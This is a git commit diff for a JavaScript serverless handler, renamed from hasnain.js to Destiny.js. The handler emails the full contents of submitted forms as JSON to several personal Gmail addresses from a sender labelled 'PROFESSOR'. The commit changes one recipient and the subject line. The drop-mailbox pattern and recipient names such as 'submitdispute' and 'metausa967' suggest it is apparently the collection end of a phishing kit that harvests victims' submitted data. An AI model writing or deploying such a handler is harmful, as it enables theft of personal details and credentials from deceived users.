511c6bc4f6b9035d48cf5ef2babf411e19204aee
zm9807350 <zm9807350@gmail.com>
2026-02-03 13:05:05 +0500

    Update and rename hasnain.js to Destiny.js

--- Destiny.js
+++ Destiny.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,hinijffkhvsxvcxdhgdtu@gmail.com",
-      subject: "Hasnain",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,metausa967@gmail.com",
+      subject: "Destiny 11",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
